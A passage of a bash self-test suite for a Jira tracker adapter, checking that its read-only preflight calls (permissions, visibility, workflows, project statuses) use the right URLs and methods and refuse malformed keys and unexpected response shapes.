  if [ "$(cat "$tmpd/.lasturl" 2>/dev/null)" = "$_pf_b/rest/api/3/mypermissions?projectKey=AB&permissions=BROWSE_PROJECTS,CREATE_ISSUES,EDIT_ISSUES,TRANSITION_ISSUES,ASSIGN_ISSUES,ADMINISTER_PROJECTS" ]; then
    echo "PASS: selftest — contract-read preflight: perms asks for the six permissions in order"
  else
    echo "FAIL: selftest — contract-read preflight: perms URL wrong ($(cat "$tmpd/.lasturl" 2>/dev/null))"; sfail=1
  fi
  _tj_fx pf-perms-browse-only
  _pf_leg "perms browse-only: browse yes, the rest no" 0 "$(printf 'BROWSE_PROJECTS\tyes\nCREATE_ISSUES\tno\nEDIT_ISSUES\tno\nTRANSITION_ISSUES\tno\nASSIGN_ISSUES\tno\nADMINISTER_PROJECTS\tno')" "$_pf_b" cloud perms AB
  _tj_fx pf-perms-hostile
  _pf_leg "S-6: hostile or missing havePermission prints unknown" 0 "$(printf 'BROWSE_PROJECTS\tunknown\nCREATE_ISSUES\tunknown\nEDIT_ISSUES\tunknown\nTRANSITION_ISSUES\tunknown\nASSIGN_ISSUES\tunknown\nADMINISTER_PROJECTS\tunknown')" "$_pf_b" cloud perms AB
  : > "$argvlog"
  _pf_leg "perms refuses a bad key (rc 1)" 1 "" "$_pf_b" cloud perms 'a;b'
  _pf_leg "perms refuses a missing key (rc 1)" 1 "" "$_pf_b" cloud perms
  if [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — contract-read preflight: a refused perms key sends no request"
  else
    echo "FAIL: selftest — contract-read preflight: a refused perms key still reached curl"; sfail=1
  fi

  # --- visibility × {equal, hidden, 403 levels, dc, hostile count, bad key} ---
  _tj_fxseq pf-count-12 pf-insight-12 pf-levels-2
  _pf_leg "visibility cloud equal" 0 "$(printf 'visible\t12\ntotal\t12\nlevels\t2')" "$_pf_b" cloud visibility AB
  _tj_fxseq pf-count-9 pf-insight-12 pf-levels-2
  _pf_leg "visibility cloud hidden (visible 9 of 12)" 0 "$(printf 'visible\t9\ntotal\t12\nlevels\t2')" "$_pf_b" cloud visibility AB
  _tj_fxseq pf-count-12 pf-insight-12 forbidden
  _pf_leg "visibility: a 403 on the security-level read prints levels unknown, rc 0" 0 "$(printf 'visible\t12\ntotal\t12\nlevels\tunknown')" "$_pf_b" cloud visibility AB
  _tj_fxseq pf-count-12 pf-insight-12 not-found
  _pf_leg "visibility: a 404 on the security-level read prints levels unknown, rc 0" 0 "$(printf 'visible\t12\ntotal\t12\nlevels\tunknown')" "$_pf_b" cloud visibility AB
  _tj_fxseq pf-dc-search-7 pf-levels-2
  _pf_leg "visibility dc: .total is the visible count, total unknown" 0 "$(printf 'visible\t7\ntotal\tunknown\nlevels\t2')" "$_pf_d" datacenter visibility AB
  _tj_fxseq pf-count-hostile pf-insight-12 pf-levels-2
  _pf_leg "S-6: a hostile count prints visible unknown" 0 "$(printf 'visible\tunknown\ntotal\t12\nlevels\t2')" "$_pf_b" cloud visibility AB
  _tj_fx server-error
  _pf_leg "visibility on a failed count read is rc 2 with empty stdout" 2 "" "$_pf_b" cloud visibility AB
  _pf_leg "visibility refuses a bad key (rc 1)" 1 "" "$_pf_b" cloud visibility 'a b'

  # --- epic-model × {parent, epic-link, both, none, non-array} ---
  _tj_fx pf-field-parent
  _pf_leg "epic-model parent" 0 "$(printf 'epic\tparent')" "$_pf_b" cloud epic-model
  _tj_fx pf-field-epiclink
  _pf_leg "epic-model epic-link" 0 "$(printf 'epic\tepic-link')" "$_pf_b" cloud epic-model
  _tj_fx pf-field-both
  _pf_leg "epic-model both" 0 "$(printf 'epic\tboth')" "$_pf_b" cloud epic-model
  _tj_fx pf-field-none
  _pf_leg "epic-model none (hostile ids and a foreign custom schema do not count)" 0 "$(printf 'epic\tnone')" "$_pf_b" cloud epic-model
  _tj_fx contract-workflow
  _pf_leg "epic-model on a non-array body is rc 2" 2 "" "$_pf_b" cloud epic-model

  # --- method set: of the new resources only cloud `visibility` POSTs, and only to search/approximate-count ---
  : > "$tmpd/.methods"; : > "$tmpd/.urls"; _tj_fxseq pf-count-12 pf-insight-12 pf-levels-2
  tj_contract_read "$_pf_b" cloud visibility AB >/dev/null 2>&1 || true
  _pf_m=$(tr '\n' ' ' < "$tmpd/.methods")
  _pf_u1=$(sed -n '1p' "$tmpd/.urls")
  if [ "$_pf_m" = "POST GET GET " ] && [ "$_pf_u1" = "$_pf_b/rest/api/3/search/approximate-count" ]; then
    echo "PASS: selftest — contract-read preflight: cloud visibility POSTs only search/approximate-count (then two GETs)"
  else
    echo "FAIL: selftest — contract-read preflight: cloud visibility method set wrong (methods='$_pf_m' first-url='$_pf_u1')"; sfail=1
  fi
  : > "$tmpd/.methods"
  _tj_fx pf-myself-atlassian;     tj_contract_read "$_pf_b" cloud probe >/dev/null 2>&1 || true
  _tj_fx pf-serverinfo-cloud;     tj_contract_read "$_pf_b" cloud server-info >/dev/null 2>&1 || true
  _tj_fx pf-perms-all-yes;        tj_contract_read "$_pf_b" cloud perms AB >/dev/null 2>&1 || true
  _tj_fx pf-field-both;           tj_contract_read "$_pf_b" cloud epic-model >/dev/null 2>&1 || true
  _tj_fxseq pf-dc-search-7 pf-levels-2; tj_contract_read "$_pf_d" datacenter visibility AB >/dev/null 2>&1 || true
  _pf_m=$(tr '\n' ' ' < "$tmpd/.methods")
  if [ "$_pf_m" = "GET GET GET GET GET GET " ]; then
    echo "PASS: selftest — contract-read preflight: probe, server-info, perms, epic-model and dc visibility are GET only"
  else
    echo "FAIL: selftest — contract-read preflight: a non-visibility resource sent a non-GET (methods='$_pf_m')"; sfail=1
  fi
}

# _tj_st_contract_tier: TRACKER-CONTRACT-HONEST-TIER legs — the project-scoped reads `--deep` and `--discover`
# stand on (project, project-statuses, project-workflows, myself). Bodies are the REAL recorded responses
# (genericized); the company-managed variants are jq edits of the real `Builds Workflow` body, so the only
# synthesized part is the edit. Each leg compares the adapter's whole stdout with a recorded expected file.
_tj_st_contract_tier() {
  _crt_run() {  # <body-file> <resource> [args...] -> crt_rc, $tmpd/.crt.out, crt_url
    cp "$1" "$tmpd/.body-tmp"; shift
    _tj_fx body-tmp; : > "$argvlog"; rm -f "$tmpd/.methods" "$tmpd/.lasturl"
    crt_rc=0
    tj_contract_read https://ex.atlassian.net cloud "$@" > "$tmpd/.crt.out" 2>"$tmpd/.crt.err" || crt_rc=$?
    crt_url=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  }
  _crt_variant() {  # <name> <jq-filter over the slim Builds body> -> $tmpd/.v-<name>.json
    jq -c '.workflows[0].transitions |= map(select(.id == "4" or .id == "301"))' "$fixdir/contract-wf-builds.json" \
      | jq -c "$2" > "$tmpd/.v-$1.json"
  }
  _crt_expect() {  # <leg> <body-file> <expected-file> <resource> [args...]: rc 0 and stdout == expected
    _ce_leg=$1; _ce_body=$2; _ce_exp=$3; shift 3
    _crt_run "$_ce_body" "$@"
    if [ "$crt_rc" -eq 0 ] && cmp -s "$tmpd/.crt.out" "$_ce_exp"; then
      echo "PASS: selftest — contract-tier/$_ce_leg: stdout is exactly the recorded adapter output"
    else
      echo "FAIL: selftest — contract-tier/$_ce_leg: rc=$crt_rc out='$(tr '\t' '|' < "$tmpd/.crt.out")'"; sfail=1
    fi
  }
  _crt_refused() {  # <leg> <body-file> <want-rc> <resource> [args...]: that rc and EMPTY stdout
    _cf_leg=$1; _cf_body=$2; _cf_rc=$3; shift 3
    _crt_run "$_cf_body" "$@"
    if [ "$crt_rc" -eq "$_cf_rc" ] && [ ! -s "$tmpd/.crt.out" ]; then
      echo "PASS: selftest — contract-tier/$_cf_leg: rc $_cf_rc and nothing on stdout"
    else
      echo "FAIL: selftest — contract-tier/$_cf_leg: rc=$crt_rc (want $_cf_rc) out='$(cat "$tmpd/.crt.out")'"; sfail=1
    fi
  }
  _crt_mut() {  # <name> <real-body> <jq-edit>
    jq -c "$3" "$fixdir/$2" > "$tmpd/.m-$1.json"
  }

  # --- project / project-statuses: the REAL team-managed bodies; a nested scope/statusCategory id never leaks ---
  _crt_expect project-team "$fixdir/contract-project-team.json" "$fixdir/contract-project-team.txt" project AB
  [ "$crt_url" = "https://ex.atlassian.net/rest/api/3/project/AB" ] \
    && echo "PASS: selftest — contract-tier/project-url: GET /rest/api/3/project/AB" \
    || { echo "FAIL: selftest — contract-tier/project-url: '$crt_url'"; sfail=1; }
  _crt_expect project-company "$fixdir/contract-project-company.json" "$fixdir/contract-project-company.txt" project AB
  _crt_mut style "contract-project-team.json" '.style = "weird"'
  _crt_refused project-unknown-style "$tmpd/.m-style.json" 2 project AB
  _crt_mut pid "contract-project-team.json" '.id = "x1"'
  _crt_refused project-bad-id "$tmpd/.m-pid.json" 2 project AB
  _crt_expect pstatuses-team "$fixdir/contract-pstatuses-team.json" "$fixdir/contract-pstatuses-team.txt" project-statuses AB
  [ "$crt_url" = "https://ex.atlassian.net/rest/api/3/project/AB/statuses" ] \
    && echo "PASS: selftest — contract-tier/pstatuses-url: GET /rest/api/3/project/AB/statuses" \
    || { echo "FAIL: selftest — contract-tier/pstatuses-url: '$crt_url'"; sfail=1; }
  _crt_expect pstatuses-company "$fixdir/contract-pstatuses-company.json" "$fixdir/contract-pstatuses-company.txt" project-statuses AB
  _crt_mut hostile "contract-pstatuses-team.json" '.[].statuses[0].name = "a\tb"'
  _crt_run "$tmpd/.m-hostile.json" project-statuses AB
  [ "$crt_rc" -eq 0 ] && grep -q '^status	10000	?$' "$tmpd/.crt.out" \
    && echo "PASS: selftest — contract-tier/pstatuses-hostile-name: a name outside printable ASCII prints '?'" \
    || { echo "FAIL: selftest — contract-tier/pstatuses-hostile-name: rc=$crt_rc"; sfail=1; }
  _crt_mut badid "contract-pstatuses-team.json" '.[0].statuses[0].id = "x"'
  _crt_refused pstatuses-bad-id "$tmpd/.m-badid.json" 2 project-statuses AB
  printf '[]' > "$tmpd/.m-empty.json"
  _crt_refused pstatuses-empty "$tmpd/.m-empty.json" 2 project-statuses AB

  # --- project-workflows: ONE bulk POST (never the deprecated site-wide search), the verdict computed in jq ---
  _crt_expect wf-team "$fixdir/contract-wf-team.json" "$fixdir/contract-wf-team.txt" project-workflows 10000 10001 10002
  if [ "$crt_url" = "https://ex.atlassian.net/rest/api/3/workflows" ] && [ "$(cat "$tmpd/.methods")" = "POST
POST" ] \
     && jq -e '.projectAndIssueTypes == [{"projectId":"10000","issueTypeId":"10002"}]' "$tmpd/.lastbody" >/dev/null 2>&1 \
     && jq -e '.projectAndIssueTypes == [{"projectId":"10000","issueTypeId":"10001"}]' "$tmpd/.body.$(($(cat "$tmpd/.bodyseq") - 1))" >/dev/null 2>&1; then
    echo "PASS: selftest — contract-tier/wf-request: one POST /rest/api/3/workflows PER issue type, each with a single projectAndIssueTypes entry"
  else
    echo "FAIL: selftest — contract-tier/wf-request: url='$crt_url' methods='$(cat "$tmpd/.methods" 2>/dev/null)' body='$(cat "$tmpd/.lastbody" 2>/dev/null)'"; sfail=1
  fi
  _crt_expect wf-team-four-types "$fixdir/contract-wf-team.json" "$fixdir/contract-wf-team.txt" project-workflows 10000 10001 10002 10003 10004
  [ "$(grep -c POST "$tmpd/.methods")" -eq 4 ] \
    && echo "PASS: selftest — contract-tier/wf-read-count: the 4 issue types of the AB fixture make exactly 4 workflow reads" \
    || { echo "FAIL: selftest — contract-tier/wf-read-count: $(grep -c POST "$tmpd/.methods") reads"; sfail=1; }
  _crt_expect wf-builds "$fixdir/contract-wf-builds.json" "$fixdir/contract-wf-builds.txt" project-workflows 10100 10200
  _crt_variant any '(.workflows[0].transitions[] | select(.id == "4") | .conditions) |= {operation: "ALL", conditions: [], conditionGroups: [{operation: "ANY", conditions: .conditions, conditionGroups: []}]}'
  _crt_expect wf-any "$tmpd/.v-any.json" "$fixdir/contract-wf-any.txt" project-workflows 10100 10200
  _crt_variant anyroot '(.workflows[0].transitions[] | select(.id == "4") | .conditions.operation) = "ANY"'
  _crt_expect wf-any-root "$tmpd/.v-anyroot.json" "$fixdir/contract-wf-any.txt" project-workflows 10100 10200
  _crt_variant extra '(.workflows[0].transitions[] | select(.id == "4") | .conditions.conditions[0].parameters.roleIds) = "10002"'
  _crt_expect wf-extra-allowance "$tmpd/.v-extra.json" "$fixdir/contract-wf-extra.txt" project-workflows 10100 10200
  _crt_variant missing '(.workflows[0].transitions[] | select(.id == "4")) |= del(.conditions)'
  _crt_expect wf-missing "$tmpd/.v-missing.json" "$fixdir/contract-wf-missing.txt" project-workflows 10100 10200
  # two issue types served by two DIFFERENT workflows (one read each): the union is graded, each response carries exactly one
  _crt_variant onetwo '.workflows[0] |= (.name = "Second Workflow" | .id = "Second Workflow" | (.transitions[] | select(.id == "4")) |= del(.conditions))'
  _crt_variant first '.'
  _crt_wfseq() {  # <leg> <rc> <expected-file|-> <body1> <body2>: two issue types, a response per type
    cp "$4" "$tmpd/.body-tmp"; cp "$5" "$tmpd/.body-tmp2"; _tj_fxseq body-tmp body-tmp2; rc=0
    tj_contract_read https://ex.atlassian.net cloud project-workflows 10100 10200 10201 >"$tmpd/.crt.out" 2>/dev/null || rc=$?
    if [ "$rc" -eq "$2" ] && { [ "$3" = - ] && [ ! -s "$tmpd/.crt.out" ] || cmp -s "$tmpd/.crt.out" "$3"; }; then
      echo "PASS: selftest — contract-tier/$1: rc $2 over two issue types, one response each"
    else
      echo "FAIL: selftest — contract-tier/$1: rc=$rc want $2 out='$(cat "$tmpd/.crt.out")'"; sfail=1
    fi
  }
  _crt_wfseq wf-one-of-two 0 "$fixdir/contract-wf-one-of-two.txt" "$tmpd/.v-first.json" "$tmpd/.v-onetwo.json"
  # PARTIAL COVERAGE: the second issue type's response carries NO workflow, though the first is enforced -> never a pass
  jq -c '.workflows = []' "$tmpd/.v-first.json" > "$tmpd/.v-none.json"
  _crt_wfseq wf-partial-coverage 2 - "$tmpd/.v-first.json" "$tmpd/.v-none.json"
  jq -c '.workflows += .workflows' "$tmpd/.v-first.json" > "$tmpd/.v-two.json"
  _crt_wfseq wf-two-workflows-one-type 2 - "$tmpd/.v-first.json" "$tmpd/.v-two.json"
  # a status reference bound to two different ids, and a transition into a status its OWN workflow does not list
  _crt_variant dupref '.statuses += [{"id": "9", "statusReference": "3", "name": "Other"}]'
  _crt_refused wf-duplicate-reference "$tmpd/.v-dupref.json" 2 project-workflows 10100 10200
  _crt_variant foreign '(.workflows[0].statuses) |= map(select(.statusReference != "3"))'
  _crt_refused wf-foreign-reference "$tmpd/.v-foreign.json" 2 project-workflows 10100 10200
  # the rule is compared exactly: a `false` allowance and a padded accountIds are NOT the empty/exact values
  _crt_variant falseallow '(.workflows[0].transitions[] | select(.id == "4") | .conditions.conditions[0].parameters.roleIds) = false'
  _crt_expect wf-false-allowance "$tmpd/.v-falseallow.json" "$fixdir/contract-wf-any.txt" project-workflows 10100 10200
  _crt_variant padded '(.workflows[0].transitions[] | select(.id == "4") | .conditions.conditions[0].parameters.accountIds) = " allow-assignee "'
  _crt_expect wf-padded-account "$tmpd/.v-padded.json" "$fixdir/contract-wf-any.txt" project-workflows 10100 10200
  _crt_variant global '.workflows[0].transitions += [{"id": "900", "type": "GLOBAL", "toStatusReference": "3", "links": [], "name": "Anyone Start"}]'
  _crt_expect wf-global-unconditioned "$tmpd/.v-global.json" "$fixdir/contract-wf-global.txt" project-workflows 10100 10200
  # a statusReference need not equal the status id: the join goes reference -> statuses[] -> id
  _crt_mut ref "contract-wf-team.json" '(.statuses[] | select(.id == "10002") | .statusReference) = "ref-x" | (.workflows[0].statuses[] | select(.statusReference == "10002") | .statusReference) = "ref-x" | (.workflows[0].transitions[] | select(.toStatusReference == "10002") | .toStatusReference) = "ref-x"'
  _crt_expect wf-reference-join "$tmpd/.m-ref.json" "$fixdir/contract-wf-team.txt" project-workflows 10000 10001 10002
  # unknown shapes are UNVERIFIED (rc 2, nothing on stdout), never a pass
  _crt_mut unjoined "contract-wf-team.json" '(.workflows[0].transitions[0].toStatusReference) = "99999"'
  _crt_refused wf-unjoined-reference "$tmpd/.m-unjoined.json" 2 project-workflows 10000 10001
  _crt_mut xor "contract-wf-team.json" '(.workflows[0].transitions[2].conditions) = {operation: "XOR", conditions: [], conditionGroups: []}'
  _crt_refused wf-unknown-operation "$tmpd/.m-xor.json" 2 project-workflows 10000 10001
  _crt_mut strcond "contract-wf-team.json" '(.workflows[0].transitions[2].conditions) = "x"'
  _crt_refused wf-conditions-not-object "$tmpd/.m-strcond.json" 2 project-workflows 10000 10001
  _crt_mut nowf "contract-wf-team.json" '.workflows = []'
  _crt_refused wf-no-workflows "$tmpd/.m-nowf.json" 2 project-workflows 10000 10001
  _crt_mut nostat "contract-wf-team.json" 'del(.statuses)'
  _crt_refused wf-no-statuses "$tmpd/.m-nostat.json" 2 project-workflows 10000 10001
  _crt_mut short "contract-wf-team.json" '.isLast = false'
  _crt_refused wf-short-page "$tmpd/.m-short.json" 2 project-workflows 10000 10001
  _crt_mut hostilewf "contract-wf-team.json" '.workflows[0].name = "a\tb"'
  _crt_run "$tmpd/.m-hostilewf.json" project-workflows 10000 10001
  [ "$crt_rc" -eq 0 ] && [ "$(grep -c '^wf	?	' "$tmpd/.crt.out")" -eq 8 ] \
    && echo "PASS: selftest — contract-tier/wf-hostile-name: a workflow name outside printable ASCII prints '?'" \
    || { echo "FAIL: selftest — contract-tier/wf-hostile-name: rc=$crt_rc"; sfail=1; }

  # --- permission: a 401 is its own rc (4) so the caller can disambiguate it with `myself`; any other refusal is 2 ---
  : > "$argvlog"; _tj_fx unauthorized; rc=0
  tj_contract_read https://ex.atlassian.net cloud project-workflows 10000 10001 >"$tmpd/.crt.out" 2>/dev/null || rc=$?
  [ "$rc" -eq 4 ] && [ ! -s "$tmpd/.crt.out" ] \
    && echo "PASS: selftest — contract-tier/wf-401: rc 4, nothing on stdout" \
    || { echo "FAIL: selftest — contract-tier/wf-401: rc=$rc"; sfail=1; }
  _tj_fx not-found; rc=0
  tj_contract_read https://ex.atlassian.net cloud project-workflows 10000 10001 >"$tmpd/.crt.out" 2>/dev/null || rc=$?
  [ "$rc" -eq 2 ] && [ ! -s "$tmpd/.crt.out" ] \
    && echo "PASS: selftest — contract-tier/wf-404: any other refusal stays rc 2" \
    || { echo "FAIL: selftest — contract-tier/wf-404: rc=$rc"; sfail=1; }
  printf '{}' > "$tmpd/.m-myself.json"
  _crt_run "$tmpd/.m-myself.json" myself
  [ "$crt_rc" -eq 0 ] && [ "$(cat "$tmpd/.crt.out")" = ok ] && [ "$crt_url" = "https://ex.atlassian.net/rest/api/3/myself" ] \
    && echo "PASS: selftest — contract-tier/myself-ok: a 2xx prints only 'ok' (an HTTP-status probe, no body relayed)" \
    || { echo "FAIL: selftest — contract-tier/myself-ok: rc=$crt_rc out='$(cat "$tmpd/.crt.out")'"; sfail=1; }
  _tj_fx unauthorized; rc=0
  tj_contract_read https://ex.atlassian.net cloud myself >"$tmpd/.crt.out" 2>/dev/null || rc=$?
  [ "$rc" -eq 4 ] && [ ! -s "$tmpd/.crt.out" ] \
    && echo "PASS: selftest — contract-tier/myself-401: a rejected credential is rc 4, nothing on stdout" \
    || { echo "FAIL: selftest — contract-tier/myself-401: rc=$rc"; sfail=1; }
  _tj_fx server-error; rc=0
  tj_contract_read https://ex.atlassian.net cloud myself >"$tmpd/.crt.out" 2>/dev/null || rc=$?
  [ "$rc" -eq 2 ] && [ ! -s "$tmpd/.crt.out" ] \
    && echo "PASS: selftest — contract-tier/myself-503: a failed check that is not a 401/403 stays rc 2" \
    || { echo "FAIL: selftest — contract-tier/myself-503: rc=$rc"; sfail=1; }

  # --- Data Center has no core REST read of transition conditions: refused before any request; bad args too ---
  : > "$argvlog"; rc=0
  tj_contract_read https://ex.example.com datacenter project-workflows 10000 10001 >"$tmpd/.crt.out" 2>"$tmpd/.crt.err" || rc=$?
  [ "$rc" -eq 2 ] && [ ! -s "$argvlog" ] && grep -q 'Data Center' "$tmpd/.crt.err" \
    && echo "PASS: selftest — contract-tier/wf-dc: unverified (Data Center), rc 2, no request made" \
    || { echo "FAIL: selftest — contract-tier/wf-dc: rc=$rc"; sfail=1; }
  for _bad in "project-workflows 1x 10001" "project-workflows 10000" "project-workflows 10000 1x" "project a/b" "project" "project-statuses 1 2" "myself x"; do
    : > "$argvlog"; rc=0
    # shellcheck disable=SC2086  # the word split IS the argument vector under test
    tj_contract_read https://ex.atlassian.net cloud $_bad >/dev/null 2>&1 || rc=$?
    [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ] \
      && echo "PASS: selftest — contract-tier/refuse-args: '$_bad' is refused rc 1 before any request" \
      || { echo "FAIL: selftest — contract-tier/refuse-args: '$_bad' rc=$rc"; sfail=1; }
  done
}

# --- CLI -----------------------------------------------------------------------------------------
case "${1:-}" in
  --selftest) _tj_selftest; exit $? ;;
  get-issue) shift; tj_get_issue "$@"; exit $? ;;
  permissions) shift; tj_permissions "$@"; exit $? ;;
  assign-self) shift; tj_assign_self "$@"; exit $? ;;
  transition) shift; tj_transition "$@"; exit $? ;;
  create) shift; tj_create "$@"; exit $? ;;
  create-meta) shift; tj_create_meta "$@"; exit $? ;;
  required-fields) shift; tj_required_fields "$@"; exit $? ;;
  transition-fields) shift; tj_transition_fields "$@"; exit $? ;;
  writable-create-keys) shift; tj_writable_create_keys "$@"; exit $? ;;
  get-fields) shift; tj_get_fields "$@"; exit $? ;;
  status-ids) shift; tj_status_ids "$@"; exit $? ;;
  list-in-states) shift; tj_list_in_states "$@"; exit $? ;;
  label-counts) shift; tj_label_counts "$@"; exit $? ;;
  field-empty) shift; tj_field_empty "$@"; exit $? ;;
  contract-read) shift; tj_contract_read "$@"; exit $? ;;
  '') echo "usage: tracker-jira.sh get-issue|permissions|assign-self|transition|create|create-meta|required-fields|transition-fields|writable-create-keys|status-ids|list-in-states|label-counts|field-empty|contract-read(internal) ... | --selftest" >&2; exit 2 ;;
  *) echo "usage: tracker-jira.sh get-issue|permissions|assign-self|transition|create|create-meta|required-fields|transition-fields|writable-create-keys|status-ids|list-in-states|label-counts|field-empty|contract-read(internal) ... | --selftest" >&2; exit 2 ;;
esac
